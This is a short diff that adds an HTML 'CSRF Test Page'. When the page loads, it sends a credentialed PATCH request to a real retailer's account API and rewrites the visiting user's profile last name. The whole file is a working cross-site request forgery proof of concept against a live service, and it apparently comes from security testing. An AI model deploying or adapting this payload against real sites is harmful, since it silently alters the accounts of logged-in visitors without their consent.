@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CSRF Test Page</h2>
+    <script>
+      fetch("https://accounts.decathlon.com/myaccount_bff/members/me/profile/identity", {
+        method: "PATCH",
+        credentials: "include", // envoie les cookies de session
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ lastname: "IkramCSRF" })
+      })
+      .then(res => res.text())
+      .then(data => console.log("Réponse:", data))
+      .catch(err => console.log("Erreur:", err));
+    </script>
+  </body>
+</html>
